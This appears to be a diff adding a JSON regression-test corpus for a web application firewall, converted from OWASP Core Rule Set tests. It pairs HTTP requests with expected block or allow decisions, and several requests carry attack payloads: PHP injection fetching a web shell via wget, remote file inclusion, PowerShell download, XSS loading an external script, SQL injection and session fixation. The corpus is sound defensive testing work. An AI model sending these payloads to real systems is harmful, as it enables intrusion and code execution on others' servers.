@@ -1,0 +1,540 @@
+{
+  "format_version": 1,
+  "source": {
+    "project": "OWASP Core Rule Set",
+    "version": "4.14.0",
+    "commit": "b5b788b5bc50e68836e17995b191f72e848fed75",
+    "url": "https://codeload.github.com/coreruleset/coreruleset/tar.gz/b5b788b5bc50e68836e17995b191f72e848fed75",
+    "sha256": "c970605a62ae2dc9213d5de775fc5fbbed9423bf0435ce5456d2ffc769702123",
+    "license": "Apache-2.0",
+    "upstream_path": "tests/regression/tests/REQUEST-*",
+    "exclusions": {
+      "autocomplete headers": 12,
+      "encoded/raw request": 10,
+      "expect_error": 1,
+      "match_regex": 7,
+      "multi-stage": 2,
+      "negative with server-level status": 1,
+      "no log expectation": 21,
+      "requires upstream regression tuning": 8,
+      "rule above paranoia level 1": 1723,
+      "unknown rule id": 1
+    },
+    "source_manifest_sha256": "3d316c962f8aaba8f71ce1a34b8782beb7182a8657902796e19028d12f987494",
+    "converter": "scripts/convert-crs-corpus.py",
+    "generated_from": "request-phase regression YAML at the pinned CRS commit, projected to the default PL1 block/allow decision"
+  },
+  "cases": [
+    {
+      "id": "crs-911100-1",
+      "description": "CRS rule 911100 test 1",
+      "request": {
+        "method": "GET",
+        "uri": "/get",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "User-Agent": "OWASP CRS test agent",
+          "Host": "localhost",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        },
+        "body": null
+      },
+      "expected": "allow",
+      "expected_rule_ids": [
+        911100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "method",
+        "negative"
+      ],
+      "source": {
+        "file": "REQUEST-911-METHOD-ENFORCEMENT/911100.yaml",
+        "test_id": 1,
+        "rule_id": 911100
+      }
+    },
+    {
+      "id": "crs-913100-1",
+      "description": "Request Indicates a Security Scanner Scanned the Site (913100) from old modsec regressions",
+      "request": {
+        "method": "GET",
+        "uri": "/get",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Accept-Encoding": "gzip,deflate",
+          "Accept-Language": "en-us,en;q=0.5",
+          "Host": "localhost",
+          "Keep-Alive": "300",
+          "Proxy-Connection": "keep-alive",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        913100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "scanner",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-913-SCANNER-DETECTION/913100.yaml",
+        "test_id": 1,
+        "rule_id": 913100
+      }
+    },
+    {
+      "id": "crs-920100-1",
+      "description": "Standard GET request",
+      "request": {
+        "method": "GET",
+        "uri": "/get",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "User-Agent": "OWASP CRS test agent",
+          "Host": "localhost",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        },
+        "body": null
+      },
+      "expected": "allow",
+      "expected_rule_ids": [
+        920100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "protocol",
+        "negative"
+      ],
+      "source": {
+        "file": "REQUEST-920-PROTOCOL-ENFORCEMENT/920100.yaml",
+        "test_id": 1,
+        "rule_id": 920100
+      }
+    },
+    {
+      "id": "crs-920100-10",
+      "description": "An invalid method with a long name",
+      "request": {
+        "method": "REALLYLONGUNREALMETHOD",
+        "uri": "/",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "User-Agent": "OWASP CRS test agent",
+          "Host": "localhost",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        },
+        "body": null
+      },
+      "expected": "allow",
+      "expected_rule_ids": [
+        920100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "protocol",
+        "negative",
+        "detection-only"
+      ],
+      "source": {
+        "file": "REQUEST-920-PROTOCOL-ENFORCEMENT/920100.yaml",
+        "test_id": 10,
+        "rule_id": 920100
+      }
+    },
+    {
+      "id": "crs-921110-1",
+      "description": "HTTP Response Splitting",
+      "request": {
+        "method": "POST",
+        "uri": "/",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Host": "localhost",
+          "Cache-Control": "no-cache, no-store, must-revalidate",
+          "User-Agent": "OWASP CRS test agent",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "22"
+        },
+        "body": "var=%0aPOST / HTTP/1.1"
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        921110
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "protocol-attack",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-921-PROTOCOL-ATTACK/921110.yaml",
+        "test_id": 1,
+        "rule_id": 921110
+      }
+    },
+    {
+      "id": "crs-922100-1",
+      "description": "Positive test: utf-7 is not in allowed charsets",
+      "request": {
+        "method": "POST",
+        "uri": "/post",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Host": "localhost",
+          "User-Agent": "OWASP CRS test agent",
+          "Content-Type": "multipart/form-data; boundary=boundary",
+          "Accept": "*/*",
+          "Content-Length": "196"
+        },
+        "body": "--boundary\nContent-disposition: form-data; name=\"_charset_\"\n\nutf-7\n--boundary\nContent-disposition: form-data; name=\"positive\"\nContent-Type: text/plain\n\nLet me see if I can use utf-7.\n--boundary--\n"
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        922100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "multipart",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-922-MULTIPART-ATTACK/922100.yaml",
+        "test_id": 1,
+        "rule_id": 922100
+      }
+    },
+    {
+      "id": "crs-930100-1",
+      "description": "Path Traversal Attack (/../) encoded",
+      "request": {
+        "method": "GET",
+        "uri": "/get",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Host": "localhost",
+          "FoobarHeader": "0x5c0x2e.%00/",
+          "User-Agent": "OWASP CRS test agent",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        930100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "lfi",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-930-APPLICATION-ATTACK-LFI/930100.yaml",
+        "test_id": 1,
+        "rule_id": 930100
+      }
+    },
+    {
+      "id": "crs-931100-1",
+      "description": "Remote File Inclusion Attack (931100) from old modsec regressions",
+      "request": {
+        "method": "GET",
+        "uri": "/get/wp-content/themes/thedawn/lib/scripts/timthumb.php?src=http://66.240.183.75/crash.php",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-sg",
+          "Host": "localhost",
+          "Keep-Alive": "300",
+          "Proxy-Connection": "keep-alive",
+          "Referer": "http",
+          "User-Agent": "OWASP CRS test agent"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        931100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "rfi",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-931-APPLICATION-ATTACK-RFI/931100.yaml",
+        "test_id": 1,
+        "rule_id": 931100
+      }
+    },
+    {
+      "id": "crs-932120-1",
+      "description": "CRS rule 932120 test 1",
+      "request": {
+        "method": "GET",
+        "uri": "/get?932120-1=Invoke-WebRequest%20http://example.com/path/file.ps1",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "User-Agent": "OWASP CRS test agent",
+          "Host": "localhost",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        932120
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "rce",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-932-APPLICATION-ATTACK-RCE/932120.yaml",
+        "test_id": 1,
+        "rule_id": 932120
+      }
+    },
+    {
+      "id": "crs-933100-1",
+      "description": "PHP Injection Attack (933100) from old modsec regressions",
+      "request": {
+        "method": "GET",
+        "uri": "/get?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Accept-Encoding": "gzip,deflate",
+          "Accept-Language": "en-us,en;q=0.5",
+          "Host": "localhost",
+          "Keep-Alive": "300",
+          "Proxy-Connection": "keep-alive",
+          "User-Agent": "OWASP CRS test agent"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        933100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "php",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-933-APPLICATION-ATTACK-PHP/933100.yaml",
+        "test_id": 1,
+        "rule_id": 933100
+      }
+    },
+    {
+      "id": "crs-934100-1",
+      "description": "imported test",
+      "request": {
+        "method": "GET",
+        "uri": "/get?foo=_%24%24ND_FUNC%24%24_",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Host": "localhost",
+          "User-Agent": "OWASP CRS test agent"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        934100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "generic",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-934-APPLICATION-ATTACK-GENERIC/934100.yaml",
+        "test_id": 1,
+        "rule_id": 934100
+      }
+    },
+    {
+      "id": "crs-941100-1",
+      "description": "Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
+      "request": {
+        "method": "GET",
+        "uri": "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "User-Agent": "OWASP CRS test agent",
+          "Host": "localhost",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        941100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "xss",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-941-APPLICATION-ATTACK-XSS/941100.yaml",
+        "test_id": 1,
+        "rule_id": 941100
+      }
+    },
+    {
+      "id": "crs-942100-1",
+      "description": "Simple SQL Injection",
+      "request": {
+        "method": "POST",
+        "uri": "/post",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Host": "localhost",
+          "User-Agent": "OWASP CRS test agent",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "17"
+        },
+        "body": "var=1234+OR+1%3D1"
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        942100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "sqli",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-942-APPLICATION-ATTACK-SQLI/942100.yaml",
+        "test_id": 1,
+        "rule_id": 942100
+      }
+    },
+    {
+      "id": "crs-943100-1",
+      "description": "Session Fixation Attack (943100) from old modsec regressions",
+      "request": {
+        "method": "GET",
+        "uri": "/get/foo.php?bar=blah<script>document.cookie=\"sessionid=1234;%20domain=.example.dom\";</script>",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-sg",
+          "Host": "localhost",
+          "Keep-Alive": "300",
+          "Proxy-Connection": "keep-alive",
+          "Referer": "http",
+          "User-Agent": "OWASP CRS test agent"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        943100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "session-fixation",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION/943100.yaml",
+        "test_id": 1,
+        "rule_id": 943100
+      }
+    },
+    {
+      "id": "crs-944100-1",
+      "description": "Argument test includes keywords java.lang.Runtime",
+      "request": {
+        "method": "POST",
+        "uri": "/post",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "Host": "localhost",
+          "User-Agent": "OWASP CRS test agent",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+          "Accept-Encoding": "gzip,deflate",
+          "Accept-Language": "en-us,en;q=0.5",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Length": "22"
+        },
+        "body": "test=java.lang.Runtime"
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        944100
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "java",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-944-APPLICATION-ATTACK-JAVA/944100.yaml",
+        "test_id": 1,
+        "rule_id": 944100
+      }
+    },
+    {
+      "id": "crs-949110-1",
+      "description": "Test is basically identical to 941100-1 (XSS positive test in phase 2) but here we assert that the inbound blocking mechanism is triggered",
+      "request": {
+        "method": "GET",
+        "uri": "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
+        "http_version": "HTTP/1.1",
+        "headers": {
+          "User-Agent": "OWASP CRS test agent",
+          "Host": "localhost",
+          "Accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+        },
+        "body": null
+      },
+      "expected": "block",
+      "expected_rule_ids": [
+        949110
+      ],
+      "tags": [
+        "crs",
+        "upstream",
+        "anomaly",
+        "positive"
+      ],
+      "source": {
+        "file": "REQUEST-949-BLOCKING-EVALUATION/949110.yaml",
+        "test_id": 1,
+        "rule_id": 949110
+      }
+    }
+  ]
+}
